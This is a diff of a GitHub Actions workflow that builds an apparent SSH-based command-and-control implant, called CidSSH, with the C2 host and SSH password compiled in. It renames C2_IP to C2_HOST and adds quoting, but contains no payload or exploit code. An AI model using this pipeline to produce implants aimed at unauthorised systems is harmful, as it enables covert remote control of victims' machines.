@@ -6,9 +6,9 @@ on:
       types: # This configuration does not affect the page_build event above
         - created
 
-# Hardcode C2_IP and C2 SSH password so the CI builds everything for you
+# Hardcode C2_IP and C2 SSH password so the CI builds everything for you. Keep quotes
 env:
-  C2_IP: ""
+  C2_HOST: ""
   PASSWORD_AUTH: ""
 
 jobs:
@@ -17,18 +17,18 @@ jobs:
         runs-on: macos-latest
         steps:
             - uses: haya14busa/action-cond@v1
-              id: c2IPCondval
+              id: c2HostCondval
               with:
-                cond: "${{ env.C2_IP == '' }}"
+                cond: "${{ env.C2_HOST == '' }}"
                 if_true: ""
-                if_false: "-DC2_IP=${{ env.C2_IP }}"
+                if_false: "-DC2_HOST=\"${{ env.C2_HOST }}\""
 
             - uses: haya14busa/action-cond@v1
               id: passwordCondval
               with:
                 cond: "${{ env.PASSWORD_AUTH == '' }}"
                 if_true: ""
-                if_false: "-DPASSWORD_AUTH=${{ env.PASSWORD_AUTH }}"
+                if_false: "-DPASSWORD_AUTH=\"${{ env.PASSWORD_AUTH }}\""
               
             - uses: actions/checkout@v1
               with:
@@ -44,7 +44,7 @@ jobs:
                   git reset --hard
                   git pull
                   ./bootstrap-vcpkg.sh
-                  
+
                   echo "set(VCPKG_BUILD_TYPE release)" >> $VCPKG_INSTALLATION_ROOT/triplets/x64-linux.cmake
                   VCPKG_FORCE_SYSTEM_BINARIES=1 vcpkg install libssh[core,openssl] --triplet x64-osx
             
@@ -54,7 +54,7 @@ jobs:
                   export CPPFLAGS="-I/usr/local/opt/openssl/include"
                   export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
                   cmake --version
-                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.c2IPCondval.outputs.value }} ${{ steps.passwordCondval.outputs.value }} -DCMAKE_TOOLCHAIN_FILE="$VCPKG_INSTALLATION_ROOT/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
+                  cmake -S . -B build -DWITH_WEBSOCKETS=OFF ${{ steps.c2HostCondval.outputs.value }} ${{ steps.passwordCondval.outputs.value }} -DCMAKE_TOOLCHAIN_FILE="$VCPKG_INSTALLATION_ROOT/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
             
             - name: Build CidSSH in SSH mode
               run: |
